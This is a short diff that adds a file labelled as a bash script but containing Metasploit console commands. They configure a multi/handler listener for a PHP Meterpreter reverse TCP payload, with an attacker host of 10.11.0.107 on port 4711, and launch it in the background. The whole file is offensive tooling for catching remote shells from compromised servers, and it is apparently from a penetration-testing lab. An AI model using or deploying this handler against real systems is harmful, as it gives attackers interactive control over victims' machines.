@@ -1,0 +1,8 @@
+#!/bin/bash
+
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 10.11.0.107
+set LPORT 4711
+set ExitOnSession false
+exploit -j -z
